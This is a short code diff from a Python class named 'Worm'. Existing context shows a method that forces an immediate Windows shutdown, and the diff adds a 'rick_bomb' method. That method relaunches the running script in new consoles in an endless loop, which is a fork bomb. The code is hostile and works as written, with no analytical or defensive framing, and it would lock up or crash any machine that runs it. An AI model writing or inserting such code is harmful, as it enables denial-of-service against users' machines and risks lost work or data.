@@ -182,6 +182,10 @@ class Worm:
     def time_to_rick(self):
         sleep(10)
         os.system("shutdown /s /t 1")
+    
+    def rick_bomb(self):
+        while True:
+            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         
         
         
